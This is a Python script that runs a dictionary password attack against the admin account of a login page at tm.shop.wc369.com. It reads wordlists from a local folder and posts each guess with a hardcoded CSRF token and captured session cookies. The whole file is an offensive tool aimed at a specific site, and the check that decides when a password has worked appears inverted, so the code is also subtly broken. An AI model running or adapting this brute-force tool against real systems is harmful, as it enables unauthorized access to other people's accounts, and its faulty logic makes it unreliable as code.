import os
import requests

def send_post_request(password,password_file):
    url = "http://tm.shop.wc369.com/login"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": "tRsi1p2sp98rrHTx1EUAS8b654LYGPqELuLVToWZ",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://tm.shop.wc369.com",
        "Referer": "http://tm.shop.wc369.com/login",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "XSRF-TOKEN=eyJpdiI6Ill1NnFyaXZsYnBCRjAyN09KMDlvV0E9PSIsInZhbHVlIjoieDN5N1V2b0VsWGJxeXhmQXJnR2E2dm13OTlWMERYWWkrdXhRZHhcL1hoS3RwK3lFSHpOZWE2OFwvTmVoZ2dWTnp5IiwibWFjIjoiZWU5YjYxNTg1YjM1MGRmNjk2ZTI3Y2NlOWY3NDVmMjA2NzlkMGJiNjg1NGViMWRiODczMGVlZTdiMjhkMzYyZiJ9; laravel_session=eyJpdiI6ImlGbmxVZCtEQ3BwN2ZUN2Nwczg5Ymc9PSIsInZhbHVlIjoiRkRpNTdMZG9cL0huT3VRN002VkhMeU81M1JCVjBYdnM5WGQ4RERHMGp5MHY3ZkpBVG9DTGYrN3pPZXFEZVp6YTEiLCJtYWMiOiI0Y2ViNzg0ZjQ2ZTZlMzZhMGM0NmFmOWE5MGE3NDNkZjJkMmViZGY5MmIyYWQ4NzljZThjN2Y3NDBmODcwZDA3In0%3D"
    }

    payload = {
        "account": "admin",
        "password": password
    }

    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    print(f"Current file: {password_file}")

    if response_json["code"] != 500 or response_json["msg"] != "\u5bc6\u7801\u8f93\u5165\u4e0d\u6b63\u786e!":
        print(f"Password: {password} Posted.")
        return False

    print(f"Password: {password} Response OK.")
    print(response.text)
    return True

def process_password_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                password_file = os.path.join(root, file)
                with open(password_file, "r") as file:
                    passwords = file.read().splitlines()

                for password in passwords:
                    if send_post_request(password,password_file):
                        return

def main():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    password_directory = os.path.join(current_directory, "passwordDict")

    process_password_files_in_directory(password_directory)

if __name__ == "__main__":
    main()